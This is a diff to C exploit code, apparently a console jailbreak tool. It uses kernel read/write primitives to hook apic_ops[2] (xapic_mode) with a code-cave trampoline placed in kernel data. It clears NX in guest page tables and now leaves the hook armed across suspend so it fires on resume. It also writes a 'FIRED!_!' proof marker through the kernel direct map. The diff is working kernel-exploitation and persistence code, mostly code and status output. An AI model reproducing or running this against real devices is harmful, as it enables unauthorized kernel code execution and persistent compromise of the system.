@@ -4107,7 +4107,7 @@ ring3_fallback:
                 #define CAVE_TRAMP_CODE_SZ    56     /* bytes of code + int3 padding */
                 #define CAVE_TRAMP_TOTAL      72     /* code + 8-byte target + 8-byte proof addr */
                 #define CAVE_PROOF_MARKER     0x4649524544215F21ULL  /* "FIRED!_!" */
-                #define CAVE_PROOF_OFFSET     0x20   /* kdata_base+0x20 = proof location */
+                #define CAVE_PROOF_OFFSET     0x1000 /* kdata_base+0x1000 = proof location (different page to avoid SMC) */
 
                 if (!g_kmod_trampoline_func) {
                     printf("=============================================\n");
@@ -4227,18 +4227,33 @@ ring3_fallback:
                                                        CAVE_TRAMP_TARGET_OFF;
 
                             /*
-                             * NOTE: proof marker DMAP write DISABLED.
-                             * g_proof_marker_addr left as 0 in the trampoline.
-                             * The trampoline's test rcx,rcx;jz skips the write.
+                             * Proof marker DMAP write ENABLED.
+                             * The proof marker is written to kdata_base+0x1000
+                             * which is a DIFFERENT physical page than the
+                             * trampoline code at kdata_base+0x100.  This avoids
+                             * x86 self-modifying code (SMC) detection, which
+                             * only triggers on writes to the same physical page
+                             * as currently executing instructions.
                              *
-                             * The DMAP write (same physical page as executing
-                             * code) may trigger x86 self-modifying code machine
-                             * clears during LAPIC suspend, causing kernel panic.
-                             * We'll detect trampoline firing by checking whether
-                             * apic_ops[2] still points to the cave trampoline
-                             * after resume instead.
+                             * The trampoline loads g_proof_marker_addr (DMAP KVA
+                             * of kdata_base+0x1000), writes "FIRED!_!" magic,
+                             * then calls through to the original xapic_mode.
                              */
-                            (void)0; /* proof marker patching disabled */
+                            {
+                                uint64_t proof_dmap_kva = g_dmap_base + tramp_cave_pa
+                                                          - CAVE_TRAMP_OFFSET
+                                                          + CAVE_PROOF_OFFSET;
+                                kernel_copyin(&proof_dmap_kva,
+                                              g_dmap_base + tramp_cave_pa + CAVE_TRAMP_PROOF_OFF,
+                                              8);
+                                /* Verify */
+                                uint64_t proof_verify = 0;
+                                kernel_copyout(g_dmap_base + tramp_cave_pa + CAVE_TRAMP_PROOF_OFF,
+                                               &proof_verify, 8);
+                                printf("[+] Proof marker addr:      0x%016lx %s\n",
+                                       (unsigned long)proof_verify,
+                                       proof_verify == proof_dmap_kva ? "[OK]" : "[FAIL]");
+                            }
 
                             printf("\n[+] ============================================\n");
                             printf("[+]  CAVE TRAMPOLINE INSTALLED\n");
@@ -4247,7 +4262,7 @@ ring3_fallback:
                                    (unsigned long)g_kmod_trampoline_func);
                             printf("[+] g_trampoline_target     = 0x%016lx\n",
                                    (unsigned long)g_kmod_trampoline_target);
-                            printf("[+] Proof marker write:     DISABLED (SMC safety)\n");
+                            printf("[+] Proof marker write:     ENABLED (different page, no SMC)\n");
                             printf("[+] Guest PTE NX permanently cleared for this page.\n");
                             printf("[+] Phase 7 can now arm apic_ops[2] hook.\n");
                         } else {
@@ -5212,15 +5227,16 @@ static void campaign_flatz_setup(void) {
                 if (tramp_fired && hook_points_to_cave) {
                     printf("    >>> TRAMPOLINE FIRED DURING RESUME! <<<\n");
                     printf("    >>> Hook survived + proof marker written! <<<\n");
-                    printf("[+]   Cave tramp:      FIRED!\n");
+                    printf("[+]   Cave tramp:      FIRED! (proof + hook confirmed)\n");
                 } else if (tramp_fired && !hook_points_to_cave) {
                     printf("    >>> TRAMPOLINE FIRED but hook was restored! <<<\n");
                     printf("    (kernel may have reinitialized apic_ops)\n");
-                    printf("[+]   Cave tramp:      FIRED (hook lost)\n");
+                    printf("[+]   Cave tramp:      FIRED (hook lost post-resume)\n");
                 } else if (!tramp_fired && hook_points_to_cave) {
                     printf("    Hook still points to cave but no proof marker.\n");
-                    printf("    Trampoline may not have been called yet.\n");
-                    printf("[+]   Cave tramp:      ARMED (not fired)\n");
+                    printf("    xapic_mode may not have been called yet, or\n");
+                    printf("    proof marker write was disabled/faulted.\n");
+                    printf("[+]   Cave tramp:      ARMED (awaiting call)\n");
                 } else {
                     printf("    No proof marker, hook not pointing to cave.\n");
                     printf("    Cave trampoline was not armed during suspend.\n");
@@ -5478,6 +5494,11 @@ static void campaign_flatz_setup(void) {
                 printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
                 printf("[+]   → %s trampoline → original → returns normally\n",
                        hook_is_cave ? "cave" : "KLD");
+                if (hook_is_cave) {
+                    printf("[+]   Cave hook LEFT ARMED — will fire on resume!\n");
+                } else {
+                    printf("[+]   KLD hook restored — persistence markers only.\n");
+                }
                 printf("[+]   Wake → re-exploit → re-run tool → check results\n");
             } else {
                 printf("[+] NOTE: Hook not armed. Enter REST MODE to test\n");
@@ -5485,37 +5506,57 @@ static void campaign_flatz_setup(void) {
             }
 
             if (hook_armed) {
-                /*
-                 * ALWAYS restore apic_ops[2] to original before suspend.
-                 *
-                 * Cave trampoline: lives in kdata (kdata_base+0x100).
-                 * We cleared NX+G in the guest PTE, but other CPUs still
-                 * have stale TLB entries with NX=1 (Global entries survive
-                 * CR3 reloads — only INVLPG flushes them, which we can't
-                 * issue from userspace).  Any CPU calling apic_ops[2] hits
-                 * the stale NX TLB → #PF → kernel panic.
-                 *
-                 * KLD trampoline: pages may not be NPT-executable on
-                 * secondary CPUs.
-                 *
-                 * Both cases: restore original to prevent panic.  The hook
-                 * was verified working on the primary CPU; persistence
-                 * markers (cave + QA flags) will confirm resume detection.
-                 */
                 printf("[+]\n");
-                printf("[*] Restoring apic_ops[2] to original before rest mode.\n");
-                if (hook_is_cave)
-                    printf("    Cave trampoline: stale Global TLB entries on other CPUs\n"
-                           "    still have NX=1 — can't INVLPG from userspace.\n");
-                else
+
+                if (hook_is_cave) {
+                    /*
+                     * Cave trampoline: LEAVE ARMED during suspend.
+                     *
+                     * The cave trampoline lives in kdata (kdata_base+0x100).
+                     * Phase 5b permanently cleared NX and G in the guest PTE:
+                     *   - G=0: TLB entries are per-process (flushed on CR3 reload)
+                     *   - NX=0: page is executable in guest page tables
+                     *   - NPT allows execution on this PA (confirmed by ring-0 test)
+                     *
+                     * The trampoline calls through to the original xapic_mode
+                     * via g_trampoline_target, returning the correct APIC mode.
+                     *
+                     * On resume from S3, all TLBs are cold (hardware reset),
+                     * so stale entries are not a concern for the resume path.
+                     * The brief window between arming and suspend entry is safe
+                     * because G=0 means context switches flush this TLB entry,
+                     * and xapic_mode is only called during APIC suspend/resume.
+                     *
+                     * On resume: cpususpend_handler → lapic_resume →
+                     *   apic_ops[2](xapic_mode) → cave trampoline →
+                     *   original xapic_mode → returns 1 (xAPIC)
+                     *
+                     * The cave trampoline also writes a proof marker
+                     * ("FIRED!_!") to kdata_base+0x20 if proof_addr is set
+                     * (currently disabled for SMC safety).
+                     */
+                    printf("[*] Cave trampoline: LEAVING ARMED for suspend!\n");
+                    printf("    G=0 in guest PTE — no stale Global TLB risk.\n");
+                    printf("    NPT allows execution on kdata PA.\n");
+                    printf("    Trampoline calls original xapic_mode safely.\n");
+                    printf("    apic_ops[2] = 0x%016lx (cave trampoline)\n",
+                           (unsigned long)g_kmod_trampoline_func);
+                    printf("[+] On resume: cpususpend_handler → xapic_mode → CAVE TRAMPOLINE\n");
+                } else {
+                    /*
+                     * KLD trampoline: RESTORE before suspend.
+                     * KLD pages may not be NPT-executable on secondary CPUs.
+                     */
+                    printf("[*] KLD trampoline: Restoring apic_ops[2] before rest mode.\n");
                     printf("    KLD pages may not be NPT-executable on secondary CPUs.\n");
-                kernel_copyin(&original_xapic,
-                              g_dmap_base + ops_pa + 0x10, 8);
-                uint64_t restore_verify = 0;
-                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
-                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
-                       (unsigned long)restore_verify,
-                       restore_verify == original_xapic ? "OK" : "FAIL");
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    uint64_t restore_verify = 0;
+                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
+                    printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                           (unsigned long)restore_verify,
+                           restore_verify == original_xapic ? "OK" : "FAIL");
+                }
 
                 /* Enter rest mode programmatically */
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
